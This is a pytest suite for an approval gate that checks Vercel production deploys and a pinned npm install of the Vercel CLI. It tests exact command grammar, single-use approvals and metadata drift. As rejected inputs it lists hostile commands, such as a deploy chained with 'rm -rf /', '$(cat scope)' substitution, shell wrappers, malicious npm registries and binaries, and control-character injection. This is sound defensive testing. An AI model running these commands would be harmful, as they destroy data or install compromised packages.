"""Focused tests for the vercel (hosting CLI) structured action spec.

Unit level: classification of the exact production deploy grammar against
generic linked-project metadata, the narrow read-only forms, and the one-time
registry-pinned ``npm install --global`` action, plus adversarial admission
(quote concatenation, pathed executables, control characters, symlinked
cwd/metadata, custom registries). Gate level: exactly-once approval, metadata
drift between approval and execution-time re-classification, read-only
pass-through, and rejection of extra flags / wrappers / smuggling — against
the real store, no mocks on the security path.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from plugins.prod_approvals import actions, fingerprint, gate, resolve
from plugins.prod_approvals.store import ApprovalStore

PRJ = "prj_a1B2c3D4e5F6g7H8i9J0k1L2"
PRJ2 = "prj_Q8w7E6r5T4y3U2i1O0p9A8s7"
TEAM = "team_Z9y8X7w6V5u4T3s2R1q0P9o8"
TEAM2 = "team_M1n2B3v4C5x6Z7a8S9d0F1g2"

CMD_DEPLOY = f"vercel deploy --prod --yes --scope {TEAM}"
REG = "--registry=https://registry.npmjs.org/"
CMD_NPM = f"npm install --global {REG} vercel@25.1.0"


def CTX(**over):
    base = {
        "platform": "telegram",
        "chat_id": "chatA",
        "thread_id": "t1",
        "user_id": "userA",
        "session_id": "sessA",
        "profile": "prod",
        "task_id": "t_9b92dca5",
        "run_id": "7",
        "claim_lock": "host:123",
    }
    base.update(over)
    return base


@pytest.fixture
def base_dir(tmp_path, monkeypatch):
    d = tmp_path / "prod_approvals"
    monkeypatch.setattr(gate, "_base_dir", lambda: d)
    monkeypatch.setattr(resolve, "_base_dir", lambda: d)
    return d


def write_linked(app_dir: Path, project_id: str = PRJ, org_id: str = TEAM):
    (app_dir / ".vercel").mkdir(parents=True, exist_ok=True)
    (app_dir / ".vercel" / "project.json").write_text(
        json.dumps({"projectId": project_id, "orgId": org_id})
    )


@pytest.fixture
def real_tmp(tmp_path):
    # The deploy grammar requires a canonical (symlink-free) cwd; on macOS the
    # pytest tmp dir sits under the /var → /private/var symlink, so resolve.
    return tmp_path.resolve()


@pytest.fixture
def app_dir(real_tmp):
    d = real_tmp / "app"
    d.mkdir()
    write_linked(d)
    return d


def make_store(base_dir):
    key = fingerprint.load_or_create_key(base_dir)
    st = ApprovalStore(base_dir)
    st._fp_key = key
    return st


def store_factory(base_dir):
    return lambda: make_store(base_dir)


def sink():
    calls = []

    def next_call(args):
        calls.append(args)
        return json.dumps({"ok": True, "exit_code": 0, "stdout": "done"})

    next_call.calls = calls
    return next_call


def run_gate(base_dir, command, ctx, next_call, cwd=None):
    args = {"command": command}
    if cwd is not None:
        args["cwd"] = str(cwd)
    return gate.evaluate(
        "terminal", args, next_call,
        open_store=store_factory(base_dir), bind_context=lambda: ctx,
    )


# --- unit: valid classification + safe flag ordering ------------------------

def test_deploy_valid_classification(app_dir):
    act = actions.classify(CMD_DEPLOY, cwd=str(app_dir))
    assert isinstance(act, actions.ProdAction)
    assert act.action_class == "vercel_prod_deploy"
    assert act.read_only is False
    assert act.targets == tuple(sorted(
        (("cwd", str(app_dir)), ("project", PRJ), ("team", TEAM))
    ))


@pytest.mark.parametrize("cmd", [
    f"vercel deploy --prod --yes --scope {TEAM}",
    f"vercel deploy --yes --prod --scope {TEAM}",
    f"vercel deploy --scope {TEAM} --prod --yes",
    f"vercel deploy --yes --scope {TEAM} --prod",
])
def test_deploy_flag_order_insensitive(app_dir, cmd):
    act = actions.classify(cmd, cwd=str(app_dir))
    assert isinstance(act, actions.ProdAction)
    assert act.action_class == "vercel_prod_deploy"
    assert dict(act.targets) == {"cwd": str(app_dir), "project": PRJ, "team": TEAM}


# --- unit: missing / invalid metadata, mismatched scope, bad cwd -------------

def test_deploy_missing_metadata(real_tmp):
    bare = real_tmp / "bare"
    bare.mkdir()
    res = actions.classify(CMD_DEPLOY, cwd=str(bare))
    assert isinstance(res, actions.UnsafeCommand)
    assert "not a linked project" in res.detail


@pytest.mark.parametrize("meta", [
    {"projectId": "my-app", "orgId": TEAM},          # mutable project name
    {"projectId": PRJ, "orgId": "my-team"},          # mutable team name
    {"projectId": PRJ},                              # orgId missing
    {"orgId": TEAM},                                 # projectId missing
])
def test_deploy_invalid_metadata(real_tmp, meta):
    d = real_tmp / "app"
    (d / ".vercel").mkdir(parents=True)
    (d / ".vercel" / "project.json").write_text(json.dumps(meta))
    res = actions.classify(CMD_DEPLOY, cwd=str(d))
    assert isinstance(res, actions.UnsafeCommand)


def test_deploy_corrupt_metadata(real_tmp):
    d = real_tmp / "app"
    (d / ".vercel").mkdir(parents=True)
    (d / ".vercel" / "project.json").write_text("{not json")
    res = actions.classify(CMD_DEPLOY, cwd=str(d))
    assert isinstance(res, actions.UnsafeCommand)


def test_deploy_scope_mismatch(app_dir):
    res = actions.classify(
        f"vercel deploy --prod --yes --scope {TEAM2}", cwd=str(app_dir))
    assert isinstance(res, actions.UnsafeCommand)
    assert "does not match" in res.detail


@pytest.mark.parametrize("cwd", ["", "relative/app", "/nonexistent/definitely/missing"])
def test_deploy_bad_cwd(cwd):
    res = actions.classify(CMD_DEPLOY, cwd=cwd)
    assert isinstance(res, actions.UnsafeCommand)


def test_metadata_change_changes_targets(app_dir):
    before = actions.classify(CMD_DEPLOY, cwd=str(app_dir))
    write_linked(app_dir, project_id=PRJ2)
    after = actions.classify(CMD_DEPLOY, cwd=str(app_dir))
    assert isinstance(before, actions.ProdAction)
    assert isinstance(after, actions.ProdAction)
    assert before.targets != after.targets  # → different fingerprint → new approval


# --- unit: narrow read-only forms --------------------------------------------

@pytest.mark.parametrize("cmd,targets", [
    ("vercel whoami", ()),
    ("vercel project ls", ()),
    (f"vercel project ls --scope {TEAM}", (("team", TEAM),)),
    ("vercel ls", ()),
    (f"vercel ls --scope {TEAM}", (("team", TEAM),)),
    ("vercel inspect dpl_A1b2C3d4E5f6G7h8", ()),
    ("vercel inspect my-app-abc123.vercel.app", ()),
    (f"vercel inspect https://my-app-abc123.vercel.app --scope {TEAM}", (("team", TEAM),)),
])
def test_readonly_forms(cmd, targets):
    act = actions.classify(cmd)
    assert isinstance(act, actions.ProdAction)
    assert act.action_class == "vercel_readonly_verify"
    assert act.read_only is True
    assert act.targets == targets


@pytest.mark.parametrize("cmd", [
    "vercel whoami --json",
    "vercel project ls --json",
    "vercel project add my-app",
    "vercel ls extra-positional",
    "vercel ls --scope my-team",              # mutable scope
    "vercel inspect",
    "vercel inspect my-app",                  # mutable name, not dpl_/URL
    "vercel inspect dpl_A1b2C3d4E5f6G7h8 --logs",
])
def test_readonly_extra_args_rejected(cmd):
    res = actions.classify(cmd)
    assert isinstance(res, actions.UnsafeCommand)


# --- unit: extra flags / preview / forbidden subcommands ----------------------

@pytest.mark.parametrize("cmd", [
    f"vercel deploy --yes --scope {TEAM}",                    # preview (no --prod)
    f"vercel deploy --prod --scope {TEAM}",                   # no --yes
    "vercel deploy --prod --yes",                             # no --scope
    f"vercel deploy --prod --yes --scope {TEAM} --token x",
    f"vercel deploy --prod --yes --scope {TEAM} --env K=V",
    f"vercel deploy --prod --yes --scope {TEAM} --prebuilt",
    f"vercel deploy --prod --yes --scope {TEAM} --force",
    f"vercel deploy ./dist --prod --yes --scope {TEAM}",      # positional
    f"vercel deploy --prod --prod --yes --scope {TEAM}",      # duplicate
    "vercel deploy --prod --yes --scope",                     # missing value
    "vercel deploy --prod --yes --scope my-team",             # mutable scope
    f"vercel --prod --yes --scope {TEAM}",                    # bare deploy form
])
def test_deploy_grammar_violations_rejected(app_dir, cmd):
    res = actions.classify(cmd, cwd=str(app_dir))
    assert isinstance(res, actions.UnsafeCommand)


@pytest.mark.parametrize("cmd", [
    "vercel env ls",
    f"vercel env add SECRET production",
    "vercel alias set my-app.vercel.app prod.example.com",
    "vercel rollback dpl_A1b2C3d4E5f6G7h8",
    "vercel promote dpl_A1b2C3d4E5f6G7h8",
    "vercel link",
    "vercel pull",
    "vercel rm my-app",
    "vercel dev",
])
def test_forbidden_subcommands_rejected(cmd):
    res = actions.classify(cmd)
    assert isinstance(res, actions.UnsafeCommand)


# --- unit: wrappers, indirection, smuggling ----------------------------------

@pytest.mark.parametrize("cmd", [
    f"bash -c 'vercel deploy --prod --yes --scope {TEAM}'",
    f"env VERCEL_TOKEN=x vercel deploy --prod --yes --scope {TEAM}",
    f"sudo vercel deploy --prod --yes --scope {TEAM}",
    f"npx vercel deploy --prod --yes --scope {TEAM}",
    f"VERCEL_ORG_ID={TEAM} vercel deploy --prod --yes --scope {TEAM}",
    f"vercel deploy --prod --yes --scope {TEAM} && rm -rf /",
    f"vercel deploy --prod --yes --scope {TEAM} > /tmp/out",
    "vercel deploy --prod --yes --scope $(cat scope)",
])
def test_wrapper_and_indirection_rejected(app_dir, cmd):
    res = actions.classify(cmd, cwd=str(app_dir))
    assert isinstance(res, actions.UnsafeCommand)


# --- unit: one-time npm global install of the hosting CLI --------------------

def test_npm_install_canonical_form_classified():
    # Exactly one admissible argv: exact tokens, exact order, exact semver.
    act = actions.classify(f"npm install --global {REG} vercel@25.1.0", cwd="/tmp")
    assert isinstance(act, actions.ProdAction)
    assert act.action_class == "npm_install_hosting_cli"
    assert act.read_only is False
    assert act.targets == (("package", "vercel@25.1.0"),)


@pytest.mark.parametrize("cmd", [
    f"npm install -g {REG} vercel@25.1.0",           # -g shorthand rejected
    f"npm install {REG} --global vercel@25.1.0",     # reordered flags
    f"npm install --global vercel@25.1.0 {REG}",     # package before registry
    "npm install --global --registry=https://registry.npmjs.org vercel@25.1.0",  # no trailing slash
    f"npm install --global {REG} vercel@latest",     # mutable dist-tag
    f"npm install --global {REG} vercel@^25.0.0",    # range
    f"npm install --global {REG} vercel@25.1",       # not full numeric semver
    f"npm install --global {REG} vercel",            # no version pin
    "npm install --global vercel@25.1.0",            # registry pin missing
    "npm install -g vercel@25.1.0",                  # registry pin missing
    f"npm install {REG} vercel@25.1.0",              # not global
    f"npm install --global --force {REG} vercel@25.1.0",  # extra flag
    f"npm install --global {REG} vercel@25.1.0 typescript",  # extra package
    "npm exec vercel deploy",                        # execution, not install
    f"npm uninstall --global {REG} vercel@25.1.0",
])
def test_npm_other_forms_rejected(cmd):
    res = actions.classify(cmd, cwd="/tmp")
    assert isinstance(res, actions.UnsafeCommand)


@pytest.mark.parametrize("cmd", [
    "npm install --global --registry=https://evil.example.com/ vercel@25.1.0",
    "npm install --global --registry=http://registry.npmjs.org/ vercel@25.1.0",
    "npm install --global --registry=https://registry.npmjs.org.evil.com/ vercel@25.1.0",
    "npm install --global --registry https://registry.npmjs.org/ vercel@25.1.0",
    f"npm install --global {REG} {REG} vercel@25.1.0",
])
def test_npm_custom_registry_rejected(cmd):
    # Only the official registry, pinned on the command line in the exact
    # single-token form, is approvable — .npmrc or flag games cannot redirect.
    res = actions.classify(cmd, cwd="/tmp")
    assert isinstance(res, actions.UnsafeCommand)


def test_npm_without_prod_token_passes_through():
    # Token scanning is not weakened: npm without a prod CLI token is not a
    # prod-write class at all, and with one it never silently passes.
    assert actions.classify("npm install -g typescript") is None
    assert actions.is_prod_write_class(CMD_NPM) is True


# --- unit: adversarial admission (quote concatenation, paths, control chars) --

@pytest.mark.parametrize("cmd", [
    f"ver'cel' deploy --prod --yes --scope {TEAM}",
    f'"vercel" deploy --prod --yes --scope {TEAM}',
    f"'ver'\"cel\" deploy --prod --yes --scope {TEAM}",
    f"'/usr/local/bin/vercel' deploy --prod --yes --scope {TEAM}",
    f"npm install --global {REG} ver'cel'@25.1.0",
])
def test_quote_concatenation_cannot_evade_admission(cmd):
    # POSIX quote games must still be admitted into full classification
    # (never silently passed through as a non-prod command).
    assert actions.is_prod_write_class(cmd) is True
    assert actions.classify(cmd, cwd="/tmp") is not None


def test_quote_concatenated_executable_resolves_to_same_bare_argv(app_dir):
    # After unquoting, ver'cel' IS the bare `vercel` executable — identical
    # argv, identical fingerprint, identical gating as the unquoted spelling.
    act = actions.classify(
        f"ver'cel' deploy --prod --yes --scope {TEAM}", cwd=str(app_dir))
    assert isinstance(act, actions.ProdAction)
    assert act.argv[0] == "vercel"


@pytest.mark.parametrize("cmd", [
    f"/usr/local/bin/vercel deploy --prod --yes --scope {TEAM}",
    f"/tmp/evil/vercel deploy --prod --yes --scope {TEAM}",
    f"'/tmp/evil/vercel' deploy --prod --yes --scope {TEAM}",
    f"./vercel deploy --prod --yes --scope {TEAM}",
    f"/usr/local/bin/npm install --global {REG} vercel@25.1.0",
])
def test_pathed_executables_rejected(app_dir, cmd):
    # Only exact bare `vercel` / `npm` identity is classifiable; arbitrary
    # path basenames are rejected, never classified, never passed through.
    res = actions.classify(cmd, cwd=str(app_dir))
    assert isinstance(res, actions.UnsafeCommand)


@pytest.mark.parametrize("cmd", [
    CMD_DEPLOY + "\n",
    CMD_DEPLOY.replace("deploy", "deplo'y\n'"),          # quoted newline
    "vercel inspect 'dpl_A1b2C3d4E5f6G7h8\x01'",         # quoted control char
    f"npm install --global {REG} 'vercel@25.1.0\n'",     # newline in semver
    "vercel\tdeploy --prod --yes --scope " + TEAM,       # tab metacharacter
])
def test_control_characters_rejected(app_dir, cmd):
    res = actions.classify(cmd, cwd=str(app_dir))
    assert isinstance(res, actions.UnsafeCommand)


def test_symlinked_cwd_rejected(real_tmp):
    real = real_tmp / "real-app"
    real.mkdir()
    write_linked(real)
    link = real_tmp / "link-app"
    link.symlink_to(real)
    res = actions.classify(CMD_DEPLOY, cwd=str(link))
    assert isinstance(res, actions.UnsafeCommand)
    assert "canonical" in res.detail


def test_symlinked_metadata_dir_rejected(real_tmp):
    other = real_tmp / "other"
    (other / ".vercel").mkdir(parents=True)
    (other / ".vercel" / "project.json").write_text(
        json.dumps({"projectId": PRJ, "orgId": TEAM}))
    app = real_tmp / "app"
    app.mkdir()
    (app / ".vercel").symlink_to(other / ".vercel")
    res = actions.classify(CMD_DEPLOY, cwd=str(app))
    assert isinstance(res, actions.UnsafeCommand)
    assert "symlink" in res.detail


def test_symlinked_metadata_file_rejected(real_tmp):
    elsewhere = real_tmp / "elsewhere.json"
    elsewhere.write_text(json.dumps({"projectId": PRJ, "orgId": TEAM}))
    app = real_tmp / "app"
    (app / ".vercel").mkdir(parents=True)
    (app / ".vercel" / "project.json").symlink_to(elsewhere)
    res = actions.classify(CMD_DEPLOY, cwd=str(app))
    assert isinstance(res, actions.UnsafeCommand)
    assert "symlink" in res.detail


# --- gate: request → approve → execute once → replay blocked -----------------

def test_gate_deploy_request_approve_execute_replay(base_dir, app_dir):
    nc = sink()
    ctx = CTX()

    r1 = json.loads(run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=app_dir))
    assert r1["blocked"] is True
    assert r1["class"] == "vercel_prod_deploy"
    nonce = r1["nonce"]
    assert nc.calls == []
    assert ["team", TEAM] in r1["targets"] and ["project", PRJ] in r1["targets"]

    out = json.loads(resolve.handle(nonce, open_store=store_factory(base_dir),
                                    bind_context=lambda: ctx))
    assert out["ok"] is True and out["action"] == "approved"

    r2 = run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=app_dir)
    assert json.loads(r2)["exit_code"] == 0
    assert len(nc.calls) == 1

    # Replay: blocked again, still exactly one execution.
    r3 = json.loads(run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=app_dir))
    assert r3["blocked"] is True
    assert len(nc.calls) == 1


# --- gate: TOCTOU — metadata or cwd changed between approval and execution ---

def test_gate_toctou_project_id_changed_after_approval(base_dir, app_dir):
    nc = sink()
    ctx = CTX()
    r1 = json.loads(run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=app_dir))
    resolve.handle(r1["nonce"], open_store=store_factory(base_dir),
                   bind_context=lambda: ctx)
    # Repoint the linked project between approval and execution.
    write_linked(app_dir, project_id=PRJ2)
    res = json.loads(run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=app_dir))
    assert res["blocked"] is True
    assert nc.calls == []


def test_gate_toctou_org_changed_after_approval(base_dir, app_dir):
    nc = sink()
    ctx = CTX()
    r1 = json.loads(run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=app_dir))
    resolve.handle(r1["nonce"], open_store=store_factory(base_dir),
                   bind_context=lambda: ctx)
    write_linked(app_dir, org_id=TEAM2)  # --scope no longer matches
    res = json.loads(run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=app_dir))
    assert res["blocked"] is True
    assert "nonce" not in res  # unstructured now, not even requestable
    assert nc.calls == []


def test_gate_toctou_metadata_deleted_after_approval(base_dir, app_dir):
    nc = sink()
    ctx = CTX()
    r1 = json.loads(run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=app_dir))
    resolve.handle(r1["nonce"], open_store=store_factory(base_dir),
                   bind_context=lambda: ctx)
    (app_dir / ".vercel" / "project.json").unlink()
    res = json.loads(run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=app_dir))
    assert res["blocked"] is True
    assert nc.calls == []


def test_gate_changed_cwd_blocked(base_dir, real_tmp):
    a = real_tmp / "appA"
    b = real_tmp / "appB"
    a.mkdir()
    b.mkdir()
    write_linked(a)
    write_linked(b)  # identical metadata, different directory
    nc = sink()
    ctx = CTX()
    r1 = json.loads(run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=a))
    resolve.handle(r1["nonce"], open_store=store_factory(base_dir),
                   bind_context=lambda: ctx)
    res = json.loads(run_gate(base_dir, CMD_DEPLOY, ctx, nc, cwd=b))
    assert res["blocked"] is True
    assert nc.calls == []


# --- gate: read-only pass-through, rejects create no pending -----------------

def test_gate_readonly_passes_through(base_dir):
    nc = sink()
    for cmd in ("vercel whoami", "vercel ls", f"vercel project ls --scope {TEAM}",
                "vercel inspect dpl_A1b2C3d4E5f6G7h8"):
        res = run_gate(base_dir, cmd, CTX(), nc)
        assert json.loads(res)["exit_code"] == 0
    assert len(nc.calls) == 4  # all executed with NO approval
    st = make_store(base_dir)
    assert st.list_pending() == []  # and no pending requests created
    st.close()


def test_gate_write_still_gated_after_readonly(base_dir, app_dir):
    nc = sink()
    run_gate(base_dir, "vercel whoami", CTX(), nc)
    res = json.loads(run_gate(base_dir, CMD_DEPLOY, CTX(), nc, cwd=app_dir))
    assert res["blocked"] is True
    assert len(nc.calls) == 1  # only the read executed


def test_gate_extra_flag_blocked_without_nonce(base_dir, app_dir):
    nc = sink()
    res = json.loads(run_gate(
        base_dir, f"vercel deploy --prod --yes --scope {TEAM} --token x",
        CTX(), nc, cwd=app_dir))
    assert res["blocked"] is True
    assert "nonce" not in res  # unstructured: not approvable at all
    assert nc.calls == []
    st = make_store(base_dir)
    assert st.list_pending() == []
    st.close()


def test_gate_wrapper_smuggling_blocked(base_dir, app_dir):
    nc = sink()
    for cmd in (f"bash -c 'vercel deploy --prod --yes --scope {TEAM}'",
                f"npx vercel deploy --prod --yes --scope {TEAM}"):
        res = json.loads(run_gate(base_dir, cmd, CTX(), nc, cwd=app_dir))
        assert res["blocked"] is True
    assert nc.calls == []


# --- gate: one-time npm install of the hosting CLI ---------------------------

def test_gate_npm_install_approve_once_replay_blocked(base_dir):
    nc = sink()
    ctx = CTX()
    r1 = json.loads(run_gate(base_dir, CMD_NPM, ctx, nc, cwd="/tmp"))
    assert r1["blocked"] is True
    assert r1["class"] == "npm_install_hosting_cli"
    assert ["package", "vercel@25.1.0"] in r1["targets"]
    assert nc.calls == []

    resolve.handle(r1["nonce"], open_store=store_factory(base_dir),
                   bind_context=lambda: ctx)
    assert json.loads(run_gate(base_dir, CMD_NPM, ctx, nc, cwd="/tmp"))["exit_code"] == 0
    assert len(nc.calls) == 1

    r3 = json.loads(run_gate(base_dir, CMD_NPM, ctx, nc, cwd="/tmp"))
    assert r3["blocked"] is True
    assert len(nc.calls) == 1


def test_gate_npm_dist_tag_blocked_without_nonce(base_dir):
    nc = sink()
    res = json.loads(run_gate(base_dir, f"npm install --global {REG} vercel@latest",
                              CTX(), nc, cwd="/tmp"))
    assert res["blocked"] is True
    assert "nonce" not in res
    assert nc.calls == []
